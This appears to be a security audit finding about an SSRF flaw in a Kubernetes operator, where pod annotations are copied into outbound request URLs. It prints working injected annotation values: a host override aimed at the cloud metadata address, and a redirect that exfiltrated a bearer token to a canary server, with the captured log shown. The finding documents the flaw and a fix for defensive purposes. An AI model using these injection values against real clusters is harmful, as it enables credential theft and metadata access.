### M-92 · Annotation-driven serving URLs: a tenant-controlled SSRF primitive · **MAJOR** · 🔴 LIVE (weaponized) · `ACTUATION`
**What:** Eight pod annotations are copied verbatim into the URLs Phorvex POSTs to (paths by raw concatenation, port, bearer token, adapter source). Whoever can write pod annotations in a protected namespace configures Phorvex's own admin control plane — including host-override via `…:8000@169.254.169.254/…` (cloud metadata SSRF issued from the operator pod).
**Live weaponization (second pass, 2026-08-21):** proven end-to-end by riding the standing churn (M-28). A canary HTTP server was stood up in a test namespace; the flagship vLLM pod was annotated with `phorvex.ai/kv-reset-path: "@<canary-ip>:8080/ssrf"` and `phorvex.ai/serving-token: "SECRET-CANARY-TOKEN-12345"`. On the next two churn cycles the brain's kv-reset fired at the canary instead of vLLM — the canary log shows `CANARY-HIT method=POST path=/ssrf auth=Bearer SECRET-CANARY-TOKEN-12345`, twice. So: URL redirection AND bearer-token exfiltration, from two pod annotations, no other access needed. (Annotations removed after the PoC; the pod was never restarted.)
**Fix:** build URLs via `url.URL{Host: net.JoinHostPort(podIP, port)}` (host can only be the pod IP); validate path annotations against a strict regex (`^/[a-z0-9/_-]*$`); move the token to a Secret reference.
*Sources: A-99, A-117, A-127, A-177; weaponized live test V5 (2026-08-21).*
